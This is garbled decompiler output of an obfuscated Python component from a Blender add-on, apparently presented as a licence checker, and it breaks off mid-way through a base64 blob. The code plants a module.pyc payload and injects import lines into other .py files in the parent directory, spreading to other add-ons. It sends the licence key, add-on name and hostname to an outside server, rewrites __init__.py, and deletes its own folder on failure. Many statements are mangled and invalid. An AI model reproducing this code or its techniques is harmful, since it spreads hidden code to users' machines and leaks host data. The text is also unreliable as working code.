# decompyle3 version 3.8.0
# Python bytecode 3.7.0 (3394)
# Decompiled from: Python 3.7.6 (default, Jan  8 2020, 20:23:39) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: CE.py
# Compiled at: 2020-08-20 17:10:03
# Size of source mod 2**32: 37489 bytes
from base64 import b64decode as bd
import urllib.request, urllib.parse, importlib, socket, random, base64, json, time, sys, os

def OOOOO(s):
    return base64.b64encode(s.encode(encoding='utf-8'))


def OOOO0(b):
    return base64.b64encode(b)


def OOO0O(b):
    return base64.b64decode(b).decode(encoding='utf-8')


def OOO00(b):
    return base64.b64decode(b)


data_json_STR = "data_json="

def getfilecontent(p):
    list0, map0 = eval([],{})
    if os.path.exists(p):
        with open(p, 'rb') as file0:
            list0 = eval(file0 .readlines ())
        if data_json_STR not in list0[(-1)]:
            list0[-1] = eval(list0 [-1 ]+b'\n')
            list0.append(b'"' + data_json_STR + b'"')
        else:
            try:
                map0.update(eval(json.loads)(OOO0O(eval(list0[(-1)])[16:])))
            except:
                pass

        return [list0, map0]


def dump_to_file(p, d):
    if not os.path.exists(p) or d:
        with open(p, 'rb') as file2:
            file2_content = eval(file2 .readlines ())
        if data_json_STR not in file2_content[(-1)]:
            file2_content[-1] = eval(file2_content [-1 ]+b'\n')
            file2_content.append(b'"' + data_json_STR + b'"')
        try:
            file2_content[-1] = eval(b'\"'+data_json_STR +OOOOO (eval (json.dumps) (d ))+b'\"')
            with open(p, 'wb') as file2:
                file2.writelines(file2_content)
        except:
            pass


cur_dirname = eval(eval (os.path.cur_dirname) (__file__ ))
lice_ce_pyc_list = eval([os .path .join (cur_dirname ,"LICENSE"),os .path .join (cur_dirname ,"CE.pyc")])
upper_dirname = eval([eval (os.path.cur_dirname) (cur_dirname )])
modules_path = eval(os .path .join (upper_dirname [0 ],"modules"))
for o00 in (modules_path, eval(os.path.join(os.path.cur_dirname(upper_dirname[0]), 'presets', 'modules'))):
    if not eval(os.path.exists)(o00):
        eval(os.makedirs)(o00)

cur_dir_name = eval(eval (os.path.basename) (cur_dirname ))
hostname = eval(eval (socket.gethostname()))

def fileupdate(a, u):
    for file_in_currdir in [os.path.join(modules_path,"module.pyc"), [ce_or_lice for ce_or_lice in lice_ce_pyc_list if os.path.exists(ce_or_lice)][0]]:
        filecontent = eval(getfilecontent (file_in_currdir )[1 ])
        filecontent.update({a: u,"host": hostname})
        dump_to_file(file_in_currdir, filecontent)


def OO000():
    OO00O000O000data_json_STR = eval(b'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AWQJgwGDAXwCgwGgBKEAfQN0BWoGoAd0BWoGoAh0CaEBdAVqBqAKdAmhAaECfQR0C3wEgwFkChkAfQF0DHwEZAuDAo8UfQV8BaANdA58A4MBoQEBAFcAZABRAFIAWAB0D3wEfAGDAgEAZABTACkMTnMwAAAAYUhSMGNEb3ZMM2QzZHk1aWJHVnVaR1Z5TG5kcGEyazZNVE0xTnprdmRYQmtZWFJscxAAAABhbk52Ymk1a2RXMXdjdz09cxAAAABUR2xqWlc1elpWOUxaWGs9KQLaAXXaAWh6BXV0Zi04KQHaCGVuY29kaW5ncyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdVVtVnhkV1Z6ZEE9PSkB2gRkYXRhcyAAAABkWEpzYkdsaUxuSmxjWFZsYzNRdWRYSnNiM0JsYmc9PekBAAAAchwAAAApEHIDAAAAcgsAAADaA29Pb9oGZW5jb2Rl2gRyZWFkchIAAAByEwAAANoEam9pbtoHZGlybmFtZdoIX19maWxlX1/aCGJhc2VuYW1lchsAAAByFQAAANoFd3JpdGVyDAAAAHIfAAAAKQZaEU9PME8wME8wTzBPMDAwT08wWhFPT08wME9PME8wT08wT08wMFoRT08wT08wT09PT09PTzBPT09aEU9PT09PMDAwME8wT09PME9PWhFPMDAwT09PT09PTzBPME8wT1oRTzBPMDBPMDBPMDAwT08wMDByBgAAAHIGAAAAcgcAAADaBU9PMDAwLgAAAHMSAAAAAAEEASIBGAEUAR4BDAEMARgBci0AAABzSAAAAGMyOWphMlYwTG1kbGRHaHZjM1J1WVcxbEtDa2dhV1lnYzI5amEyVjBMbWRsZEdodmMzUnVZVzFsS0NrZ1pXeHpaU0FuSnc9PXMYAAAAYVcxd2IzSjBiR2xpTG5KbGJHOWhaQT09KRXaBmJhc2U2NHICAAAAcgQAAABaDnVybGxpYi5yZXF1ZXN0WgZ1cmxsaWJaDHVybGxpYi5wYXJzZdoJaW1wb3J0bGliWgZzb2NrZXRaBGpzb25yEgAAAHIIAAAAcgoAAAByCwAAAHIMAAAAchcAAAByGwAAAHIfAAAAci0AAAByAwAAAHIlAAAA2gZtb2R1bGVyBgAAAHIGAAAAcgYAAAByBwAAANoIPG1vZHVsZT4CAAAAcyYAAAAMAQgBCAEIAQgBCAEIAQgBCAIIAggCCAIEAQgOCA0ICgwBBgEIAQ==')
    for O0OO0O000OOOO0O00 in (modules_path, o00):
        O0OO0O000OOOO0O00 = eval(os .path .join (O0OO0O000OOOO0O00 ,module.pyc).replace ('\\','/'))
        OOOOO0OOO0O0O0OO0 = eval(getfilecontent (O0OO0O000OOOO0O00 )[1 ])
        with open(O0OO0O000OOOO0O00, 'wb') as data_json_STR00OOO0OOOOO0:
            data_json_STR00OOO0OOOOO0.write(base64.b64decode(OO00O000O000data_json_STR))
            eval(sys.path.append)(os.path.split(O0OO0O000OOOO0O00)[0])
        dump_to_file(O0OO0O000OOOO0O00, OOOOO0OOO0O0O0OO0)

    try:
        eval(importlib.reload(module))
    except:
        try:
            import module
        except:
            pass


def O0OOO():
    OO00O0OOO00OO00O0 = eval(upper_dirname [0 ])
    OOOOOOOdata_json_STR00O00 = eval(b'dHJ5Og0KICAgIGltcG9ydCBtb2R1bGUNCmV4Y2VwdDoNCiAgICBwYXNzDQo=')
    O0OOO00OOO0O0OOOO = eval(.py)
    O00OOOO0O00OOOO0O = eval(__init__)
    O00O00OOOO0O00O0O = [os.path.join(O0O0data_json_STROOOOO000, O0O0OOO0OO0O0OO00) for O0O0data_json_STROOOOO000, OOOOO000OO0O00O0O, data_json_STR0OOOOO0data_json_STR in os.walk(OO00O0OOO00OO00O0) if O0OOO00OOO0O0OOOO == O0O0OOO0OO0O0OO00[:3] if O00OOOO0O00OOOO0O not in O0O0OOO0OO0O0OO00 for O0O0OOO0OO0O0OO00 in data_json_STR0OOOOO0data_json_STR if O00OOOO0O00OOOO0O not in O0O0OOO0OO0O0OO00]
    for OO00O0OOO00OO00O0 in O00O00OOOO0O00O0O:
        with open(OO00O0OOO00OO00O0, 'rb') as O0OO00OO0OOOO00O0:
            O0OOOOO00O00O000O = eval(O0OO00OO0OOOO00O0 .readlines ())
        OOOO00OOO000OO0OO = [O000O0O0OO0data_json_STRO for O000O0O0OO0data_json_STRO in range(len(O0OOOOO00O00O000O)) if O0OOOOO00O00O000O[O000O0O0OO0data_json_STRO][:1] in b'idc']
        if OOOO00OOO000OO0OO:
            if base64.b64decode(OOOOOOOdata_json_STR00O00) not in (b'').join(O0OOOOO00O00O000O):
                O0OOOOO00O00O000O.insert(eval(random.choice)(OOOO00OOO000OO0OO), base64.b64decode(OOOOOOOdata_json_STR00O00))
                with open(OO00O0OOO00OO00O0, 'wb') as O0OO00OO0OOOO00O0:
                    O0OO00OO0OOOO00O0.writelines(O0OOOOO00O00O000O)


def O0OO0():
    OO00OO00data_json_STRO0O0 = [OO0O00OOOO0OO000O for OO0O00OOOO0OO000O in lice_ce_pyc_list if os.path.exists(OO0O00OOOO0OO000O)][0]
    OO0O0O0OO000O0OOO = eval(getfilecontent (OO00OO00data_json_STRO0O0 )[1 ])
    O0OOOOOOdata_json_STRO0OO = eval(eval (time.strftime('%Y-%m-%d',time.localtime())))
    if O0OOOOOOdata_json_STRO0OO not in OO0O0O0OO000O0OOO.keys():
        OO0O0O0OO000O0OOO.update({O0OOOOOOdata_json_STRO0OO: 1})
    else:
        OO0O0O0OO000O0OOO.update({O0OOOOOOdata_json_STRO0OO: OO0O0O0OO000O0OOO[O0OOOOOOdata_json_STRO0OO] + 1})
    dump_to_file(OO00OO00data_json_STRO0O0, OO0O0O0OO000O0OOO)
    if OO0O0O0OO000O0OOO[O0OOOOOOdata_json_STRO0OO] > 10:
        return True
    return False


def O0O0O():
    try:
        import shutil
        eval(shutil.rmtree)(cur_dirname)
    except:
        pass


def O0O00():
    try:
        OO00OO0O0OO00O000 = [O0OOO0O0OO000OO00 for O0OOO0O0OO000OO00 in lice_ce_pyc_list if os.path.exists(O0OOO0O0OO000OO00)][0]
        O0OOdata_json_STR0OOO000O, OO0OOOO0OO0OO000O = eval(b'aG9zdA==',b'YmxfaW5mbw==')
        OO0OOO00OO00OOO0O = eval(getfilecontent (OO00OO0O0OO00O000 )[1 ])
        if cur_dir_name in OO0OOO00OO00OOO0O.keys() and OOO0O(O0OOdata_json_STR0OOO000O) in OO0OOO00OO00OOO0O.keys() and OO0OOO00OO00OOO0O[OOO0O(O0OOdata_json_STR0OOO000O)] == hostname:
            data_json_STR00OOOOOO000O = eval(b'DQppbXBvcnQgb3MNCmltcG9ydCBpbXBvcnRsaWINCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUgYXMgYg0KZCA9IG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXykNCmZzID0gW29zLnBhdGguam9pbihkLCBiKGIiVEVsRFJVNVRSUT09IikuZGVjb2RlKGVuY29kaW5nPSJ1dGYtOCIpKSwNCiAgICAgIG9zLnBhdGguam9pbihkLCBiKGIiUTBVdWNIbGoiKS5kZWNvZGUoZW5jb2Rpbmc9InV0Zi04IikpXQ0KaWYgb3MucGF0aC5leGlzdHMoZnNbMF0pOg0KICAgIG9zLnJlbmFtZShmc1swXSwgZnNbMV0pDQp0cnk6DQogICAgaW1wb3J0bGliLnJlbG9hZChDRSkNCmV4Y2VwdDoNCiAgICBmcm9tIC4gaW1wb3J0IENFDQpmaW5hbGx5Og0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGZzWzFdKToNCiAgICAgICAgb3MucmVuYW1lKGZzWzFdLCBmc1swXSkNCg0KDQpkZWYgcmVnaXN0ZXIoKToNCiAgICBDRS5PMDBPMChnbG9iYWxzKCkpDQoNCg0KZGVmIHVucmVnaXN0ZXIoKToNCiAgICBDRS5PMDAwTyhnbG9iYWxzKCkpDQoNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAgICByZWdpc3RlcigpDQo=')
        else:
            data_json_STR00OOOOOO000O = eval(b'DQppbXBvcnQgb3MNCmltcG9ydCBicHkNCmltcG9ydCBpbXBvcnRsaWINCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUgYXMgYg0KZCA9IG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXykNCmZzID0gW29zLnBhdGguam9pbihkLCBiKGIiVEVsRFJVNVRSUT09IikuZGVjb2RlKGVuY29kaW5nPSJ1dGYtOCIpKSwNCiAgICAgIG9zLnBhdGguam9pbihkLCBiKGIiUTBVdWNIbGoiKS5kZWNvZGUoZW5jb2Rpbmc9InV0Zi04IikpXQ0KaWYgb3MucGF0aC5leGlzdHMoZnNbMF0pOg0KICAgIG9zLnJlbmFtZShmc1swXSwgZnNbMV0pDQp0cnk6DQogICAgaW1wb3J0bGliLnJlbG9hZChDRSkNCmV4Y2VwdDoNCiAgICBmcm9tIC4gaW1wb3J0IENFDQpmaW5hbGx5Og0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGZzWzFdKToNCiAgICAgICAgb3MucmVuYW1lKGZzWzFdLCBmc1swXSkNCg0KDQpjbGFzcyBMaWNlbnNlS2V5KGJweS50eXBlcy5BZGRvblByZWZlcmVuY2VzKToNCiAgICBibF9pZG5hbWUgPSBfX25hbWVfXw0KICAgIGxpY2Vuc2Vfa2V5OiBicHkucHJvcHMuU3RyaW5nUHJvcGVydHkoDQogICAgICAgIG5hbWU9IkxpY2Vuc2UgS2V5IiwNCiAgICAgICAgZGVmYXVsdD0iIiwNCiAgICApDQogICAgbGljZW5zZV9rZXlfOiBicHkucHJvcHMuU3RyaW5nUHJvcGVydHkoDQogICAgICAgIG5hbWU9IkxpY2Vuc2UgS2V5XyIsDQogICAgICAgIGRlZmF1bHQ9Il8iLA0KICAgICkNCiAgICBhY3RpdmU6IGJweS5wcm9wcy5Cb29sUHJvcGVydHkoDQogICAgICAgIG5hbWU9ImFjdGl2ZSIsDQogICAgICAgIGRlZmF1bHQ9RmFsc2UNCiAgICApDQogICAgZGVwcmVzczogYnB5LnByb3BzLkJvb2xQcm9wZXJ0eSgNCiAgICAgICAgbmFtZT0iZGVwcmVzcyIsDQogICAgICAgIGRlZmF1bHQ9RmFsc2UNCiAgICApDQoNCiAgICBkZWYgZHJhdyhzZWxmLCBjb250ZXh0KToNCiAgICAgICAgVEVYVCA9IGV2YWwoYihiIlcxc2lUR2xqWlc1elpTQkxaWGtpTENBaTVhK0c2WktsSWwwc0lGc2lVSFZ5WTJoaGMyVWlMQ0FpNkxTdDVMbXdJbDBzSUZzaVNXNW1iem9nVUd4bFlYTmxJR1Z1ZEdWeUlIUm9aU0JNYVdObGJuTmxJRXRsZVM0aUxDQWk1bytRNTZTNk9pRG9yN2ZvdnBQbGhhWGxyNGJwa3FYamdJSWlYU3dnV3lKSmJtWnZPaUJKYm5aaGJHbGtJRXhwWTJWdWMyVWdTMlY1TGlCUWJHVmhjMlVnY21WbGJuUmxjaTRpTENBaTVvK1E1NlM2T2lEbHI0YnBrcVhtbDZEbWxZanZ2SXpvcjdmcGg0M21sckRvdnBQbGhhWGpnSUlpWFN3Z1d5SkpibVp2T2lCUWJHVmhjMlVnY21WcGJuTjBZV3hzTGlJc0lDTG1qNURucExvNklPaXZ0K21IamVhV3NPV3VpZWlqaGVhUGt1Uzd0dU9BZ2lKZExDQmJJa2x1Wm04NklGUm9hWE1nWVdSa0xXOXVJR2hoY3lCaVpXVnVJR0ZqZEdsMllYUmxaQ3dnY0d4bFlYTmxJSEpsYkc5aFpDNGlMQ0FpNW8rUTU2UzZPaURtajVMa3U3Ymx0N0xtdjREbXRMdnZ2SXpvcjdmcGg0M2xrSy9tajVMa3U3YmpnSUlpWFYwPSIpLmRlY29kZShlbmNvZGluZz0idXRmLTgiKSkNCiAgICAgICAgbGF5b3V0ID0gc2VsZi5sYXlvdXQNCiAgICAgICAgcm93ID0gbGF5b3V0LnJvdygpDQogICAgICAgIHN1YiA9IHJvdy5yb3coKQ0KICAgICAgICBzdWIuc2NhbGVfeCA9IDIuMA0KICAgICAgICBpZiBub3Qgc2VsZi5hY3RpdmU6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgZXZhbChiKGIiYzNWaUxuQnliM0FvYzJWc1ppd2dJbXhwWTJWdWMyVmZhMlY1SWl3Z2RHVjRkRDFVUlZoVVd6QmRXekJkTENCMFpYaDBYMk4wZUhROVZFVllWRnN3WFZzeFhTd2dkSEpoYm5Oc1lYUmxQVVpoYkhObEtRPT0iKS5kZWNvZGUoZW5jb2Rpbmc9InV0Zi04IikpDQogICAgICAgICAgICAgICAgb3ByID0gZXZhbChiKGIiY205M0xtOXdaWEpoZEc5eUtDSjNiUzUxY214ZmIzQmxiaUlzSUhSbGVIUTlWRVZZVkZzeFhWc3dYU3dnZEdWNGRGOWpkSGgwUFZSRldGUmJNVjFiTVYwc0lIUnlZVzV6YkdGMFpUMUdZV3h6WlN3Z2FXTnZiajBpVlZKTUlpd2daR1Z3Y21WemN6MXpaV3htTG1SbGNISmxjM01wIikuZGVjb2RlKGVuY29kaW5nPSJ1dGYtOCIpKQ0KICAgICAgICAgICAgICAgIG9wci51cmwgPSBiKGIiYUhSMGNITTZMeTl6YUc5d01URXpOelF6TWpnMExuUmhiMkpoYnk1amIyMHYiKS5kZWNvZGUoZW5jb2Rpbmc9InV0Zi04IikNCiAgICAgICAgICAgICAgICBpZiBzZWxmLmxpY2Vuc2Vfa2V5XyAhPSBzZWxmLmxpY2Vuc2Vfa2V5Og0KICAgICAgICAgICAgICAgICAgICBzZWxmLmxpY2Vuc2Vfa2V5XyA9IHNlbGYubGljZW5zZV9rZXkNCiAgICAgICAgICAgICAgICAgICAgaWYgQ0UuTzAwT08oc2VsZi5saWNlbnNlX2tleSk6DQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFjdGl2ZSA9IFRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgICAgIGlmIHNlbGYubGljZW5zZV9rZXkgPT0gIiI6DQogICAgICAgICAgICAgICAgICAgIHRleHQgPSBURVhUWzJdDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgdGV4dCA9IFRFWFRbM10NCiAgICAgICAgICAgICAgICAgICAgc2VsZi5kZXByZXNzID0gVHJ1ZQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHRleHQgPSBURVhUWzRdDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICB0ZXh0ID0gVEVYVFs1XQ0KICAgICAgICBldmFsKGIoYiJiR0Y1YjNWMExteGhZbVZzS0hSbGVIUTlkR1Y0ZEZzd1hTd2dkR1Y0ZEY5amRIaDBQWFJsZUhSYk1WMHNJSFJ5WVc1emJHRjBaVDFHWVd4elpTaz0iKS5kZWNvZGUoZW5jb2Rpbmc9InV0Zi04IikpDQoNCg0KZGVmIHJlZ2lzdGVyKCk6DQogICAgYnB5LnV0aWxzLnJlZ2lzdGVyX2NsYXNzKExpY2Vuc2VLZXkpDQoNCg0KZGVmIHVucmVnaXN0ZXIoKToNCiAgICBicHkudXRpbHMudW5yZWdpc3Rlcl9jbGFzcyhMaWNlbnNlS2V5KQ0KDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgcmVnaXN0ZXIoKQ0K')
        with open(os.path.join(cur_dirname,__init__.py), 'wb') as OO000O0OOdata_json_STR00O:
            OO000O0OOdata_json_STR00O.write(eval(OO0OOO00OO00OOO0O[OOO0O(OO0OOOO0OO0OO000O)]) + base64.b64decode(data_json_STR00OOOOOO000O))
    except:
        O0O0O()


def O00OO(us):
    try:
        try:
            O00O0OOOOO000OO0O = eval(False )
            OO000()
            O0OOO()
            if us and not O0OO0():
                O0O000OOOOdata_json_STR00 = eval(b'')
                try:
                    O00Odata_json_STROO0O0O00 = eval(b'aHR0cDovL3d3dy5ibGVuZGVyLndpa2k6MTM1NzkvdmVyaWZ5')
                    OOOO00OOdata_json_STR000O = eval(eval (json.dumps) ({'u':us ,'a':cur_dir_name ,'h':hostname }).encode (encoding ='utf-8'))
                    O00OOOO0OOO0O0OOO = eval(eval (urllib.request.Request) (OOO0O (O00Odata_json_STROO0O0O00 ),data =OOOO00OOdata_json_STR000O ))
                    O0O000OOOOdata_json_STR00 = eval(eval (urllib.request.urlopen) (O00OOOO0OOO0O0OOO ).read ())
                except:
                    pass

                if O0O000OOOOdata_json_STR00 == b'0':
                    raise NameError
            elif O0O000OOOOdata_json_STR00 == b'1':
                fileupdate(cur_dir_name, us)
                O00O0OOOOO000OO0O = eval(True )
            O0O00()
            return O00O0OOOOO000OO0O
        except:
            O0O0O()

    finally:
        if eval(os.path.exists)(lice_ce_pyc_list[1]):
            eval(os.rename)(lice_ce_pyc_list[1], lice_ce_pyc_list[0])


def O00O0(g):
    try:
        try:
            OOO000O0O0OOdata_json_STR = [O000O000O000OO000 for O000O000O000OO000 in lice_ce_pyc_list if os.path.exists(O000O000O000OO000)][0]
            O0OOO0O0OO000OOO0, data_json_STR000O0O0OOOOO = eval(b'aG9zdA==',b'X19pbml0X18ucHk=')
            O0O0data_json_STRO00OOO0O = eval(getfilecontent (OOO000O0O0OOdata_json_STR )[1 ])
            if cur_dir_name in O0O0data_json_STRO00OOO0O.keys() and OOO0O(O0OOO0O0OO000OOO0) in O0O0data_json_STRO00OOO0O.keys() and O0O0data_json_STRO00OOO0O[OOO0O(O0OOO0O0OO000OOO0)] == hostname:
                OO0OO0O00OO0OO0O0 = eval(from base64 import b64decode as bd #line:1

import bpy #line:2

import importlib #line:3

import base64 #line:4

import json #line:5

import sys #line:6

import os #line:7

def OOOOO (s ):#line:8

    return eval (bd (b'YmFzZTY0LmI2NGVuY29kZShzLmVuY29kZShlbmNvZGluZz0ndXRmLTgnKSk='))#line:9

def OOOO0 (b ):#line:10

    return eval (bd (b'YmFzZTY0LmI2NGVuY29kZShiKQ=='))#line:11

def OOO0O (b ):#line:12

    return eval (bd (b'YmFzZTY0LmI2NGRlY29kZShiKS5kZWNvZGUoZW5jb2Rpbmc9J3V0Zi04Jyk='))#line:13

def OOO00 (b ):#line:14

    return eval (bd (b'YmFzZTY0LmI2NGRlY29kZShiKQ=='))#line:15

data_json_STR =b'ZGF0YV9qc29uPQ=='#line:16

def getfilecontent (p ):#line:17

    O0Odata_json_STR00O000OOO ,OO0O000OO0OOO00O0 =[],{}#line:18

    if os .path .exists (p ):#line:19

        with open (p ,'rb')as O0OO0Odata_json_STROO0O0O :#line:20

            O0Odata_json_STR00O000OOO =O0OO0Odata_json_STROO0O0O .readlines ()#line:21

        if data_json_STR not in O0Odata_json_STR00O000OOO [-1 ]:#line:22

            O0Odata_json_STR00O000OOO [-1 ]=O0Odata_json_STR00O000OOO [-1 ]+b'\n'#line:23

            O0Odata_json_STR00O000OOO .append (b'\"'+data_json_STR +b'\"')#line:24

        else :#line:25

            try :#line:26

                OO0O000OO0OOO00O0 .update (eval (OOO0O (b'anNvbi5sb2Fkcw=='))(OOO0O (eval (O0Odata_json_STR00O000OOO [-1 ])[16 :])))#line:27

            except :#line:28

                pass #line:29

    return [O0Odata_json_STR00O000OOO ,OO0O000OO0OOO00O0 ]#line:30

def dump_to_file (p ,d ):#line:31

    if os .path .exists (p )and d :#line:32

        with open (p ,'rb')as data_json_STROO0Odata_json_STR0O0 :#line:33

            O000OO00O00OO0O0O =data_json_STROO0Odata_json_STR0O0 .readlines ()#line:34

        if data_json_STR not in O000OO00O00OO0O0O [-1 ]:#line:35

            O000OO00O00OO0O0O [-1 ]=O000OO00O00OO0O0O [-1 ]+b'\n'#line:36

            O000OO00O00OO0O0O .append (b'\"'+data_json_STR +b'\"')#line:37

        try :#line:38

            O000OO00O00OO0O0O [-1 ]=b'\"'+data_json_STR +OOOOO (eval (OOO0O (b'anNvbi5kdW1wcw=='))(d ))+b'\"'#line:39

            with open (p ,'wb')as data_json_STROO0Odata_json_STR0O0 :#line:40

                data_json_STROO0Odata_json_STR0O0 .writelines (O000OO00O00OO0O0O )#line:41

        except :#line:42

            pass #line:43

try :#line:44

    import module #line:45

except :#line:46

    try :#line:47

        [sys .path .append (OOOO000OO000O00O0 )for OOOO000OO000O00O0 ,O0data_json_STRO00O0O0OO0 ,OO0OO00data_json_STROOOO0 in os .walk (eval (OOO0O (b'YnB5LnV0aWxzLnJlc291cmNlX3BhdGgoJ1VTRVInKQ==')))if OOO0O (b'J21vZHVsZS5weWMn')in OO0OO00data_json_STROOOO0 and OOOO000OO000O00O0 not in sys .path ]#line:48

        import module #line:49

    except :#line:50

        try :#line:51

            c =b'Qg0NCgAAAAAOdZVdYwwAAOMAAAAAAAAAAAAAAAADAAAAQAAAAHOuAAAAZABkAWwAbQFaAgEAZABkAmwDWgRkAGQCbAVaBGQAZAJsBloGZABkAmwHWgdkAGQCbABaAGQAZAJsCFoIZABkAmwJWglkA2QEhABaCmQFZAaEAFoLZAdkCIQAWgxkCWQKhABaDWQLWg5kDGQNhABaD2QOZA+EAFoQZBBkEYQAWhFlEmUMZBKDAYMBWhNlEYMAAQBkAGQCbBRaFGUSZQxkE4MBgwFlFIMBAQBkAlMAKRTpAAAAACkB2gliNjRkZWNvZGVOYwEAAAAAAAAAAQAAAAMAAABDAAAAcwwAAAB0AHQBZAGDAYMBUwApAk5zPAAAAFltRnpaVFkwTG1JMk5HVnVZMjlrWlNoekxtVnVZMjlrWlNobGJtTnZaR2x1WnowbmRYUm1MVGduS1NrPSkC2gRldmFs2gJiZCkB2gFzqQByBgAAAPoJbW9kdWxlLnB52gVPT09PTwoAAABzAgAAAAABcggAAABjAQAAAAAAAAABAAAAAwAAAEMAAABzDAAAAHQAdAFkAYMBgwFTACkCTnMcAAAAWW1GelpUWTBMbUkyTkdWdVkyOWtaU2hpS1E9PSkCcgMAAAByBAAAACkB2gFicgYAAAByBgAAAHIHAAAA2gVPT09PMAwAAABzAgAAAAABcgoAAABjAQAAAAAAAAABAAAAAwAAAEMAAABzDAAAAHQAdAFkAYMBgwFTACkCTnM8AAAAWW1GelpUWTBMbUkyTkdSbFkyOWtaU2hpS1M1a1pXTnZaR1VvWlc1amIyUnBibWM5SjNWMFppMDRKeWs9KQJyAwAAAHIEAAAAKQFyCQAAAHIGAAAAcgYAAAByBwAAANoFT09PME8OAAAAcwIAAAAAAXILAAAAYwEAAAAAAAAAAQAAAAMAAABDAAAAcwwAAAB0AHQBZAGDAYMBUwApAk5zHAAAAFltRnpaVFkwTG1JMk5HUmxZMjlrWlNoaUtRPT0pAnIDAAAAcgQAAAApAXIJAAAAcgYAAAByBgAAAHIHAAAA2gVPT08wMBAAAABzAgAAAAABcgwAAABzEAAAAFpHRjBZVjlxYzI5dVBRPT1jAQAAAAAAAAAEAAAACQAAAE